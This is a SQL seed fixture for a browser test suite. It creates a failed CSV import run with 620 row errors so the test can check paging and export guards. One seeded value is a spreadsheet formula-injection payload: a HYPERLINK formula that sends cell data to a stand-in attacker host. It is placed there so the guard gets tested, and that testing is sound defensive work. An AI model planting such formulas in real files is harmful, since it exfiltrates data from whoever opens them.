-- A checked run that found problems, for the round-trip browser suite.
--
-- Applied by `Generator Integration` alongside `.github/fixtures/import-target.py`,
-- and by nothing else. Neither file is inside a template, so no generated
-- product contains either.
--
-- **Seeded rather than uploaded, and the reason is the point.** The only path
-- to a run in a browser starts with an upload, and an upload needs a storage
-- bucket the round-trip harness deliberately does not configure — "no platform,
-- no Redis, no bucket. Each is absent rather than faked". Seeding the run is
-- the honest alternative to standing a bucket up for one assertion.
--
-- The row numbers start at 10,000 on purpose. That is what an ordinary file
-- with its bad rows late in it looks like, and it is what puts them on a
-- different scale from `import_row_errors.id` — which is the condition under
-- which paging on the wrong one truncates. IMP2-05 shipped because the browser
-- sent the file's line number to a route that pages on the table's own key; a
-- run numbered from 1 would pass either way and prove nothing.
-- `ready_at` is set because the API sets it whenever it marks a file ready, and the Files
-- listing orders by it and reports it as the upload time. A ready row without one is a state
-- the product never writes; seeding it made the listing fail for every other row beside it
-- (found by the `secure_files` row, whose Files page spec shares this database).
insert into public.files (id, tenant_id, category, name, storage_key, size_bytes,
                          content_type, status, scan_status, uploaded_by, ready_at)
values ('44444444-4444-4444-8444-444444444440',
        '00000000-0000-4e2e-8000-000000000001',
        'imports', 'contacts.csv', 'imports/contacts.csv', 100, 'text/csv',
        'ready', 'clean', 'e2e-subject', now())
on conflict (id) do nothing;

insert into public.import_runs (id, tenant_id, target, status, format, source_file_id,
                                delimiter, encoding, columns, mapping, operation,
                                rows_total, rows_valid, errors_total, requested_by)
values ('44444444-4444-4444-8444-444444444444',
        '00000000-0000-4e2e-8000-000000000001',
        'fixture.contacts', 'validation_failed', 'csv',
        '44444444-4444-4444-8444-444444444440', ',', 'utf-8-sig',
        array['Email', 'Name'], '{"Email":"email","Name":"name"}'::jsonb,
        'skip_duplicate', 620, 0, 620, 'e2e-subject')
on conflict (id) do nothing;

-- Four of the 620 are shaped like spreadsheet formulas, one per trigger
-- character, so the guard on the way out is asserted rather than assumed. The
-- rest carry a comma and doubled quotes, which is the cell an import rejects
-- and therefore the cell the report is most likely to hold.
insert into public.import_row_errors (run_id, tenant_id, row_number, column_name,
                                      field, code, value)
select '44444444-4444-4444-8444-444444444444',
       '00000000-0000-4e2e-8000-000000000001',
       10000 + g, 'Email', 'email', 'import.error.email',
       case g
         when 0 then '=HYPERLINK("https://attacker.test/?d="&A2,"Click")'
         when 1 then '+1+1'
         when 2 then '@SUM(1+1)'
         when 3 then '-2+3'
         else 'bad' || g || ',with"quotes"'
       end
from generate_series(0, 619) as g
where not exists (
  select 1 from public.import_row_errors
  where run_id = '44444444-4444-4444-8444-444444444444'
);

-- A plain member. Both of the harness's own subjects are administrators, and
-- "the module is hidden rather than locked" cannot be checked without somebody
-- who holds `product.access` and nothing administrative.
insert into public.tenant_members (tenant_id, user_id, role)
values ('00000000-0000-4e2e-8000-000000000001', 'e2e-plain-member', 'member')
on conflict (tenant_id, user_id) do update set role = excluded.role;
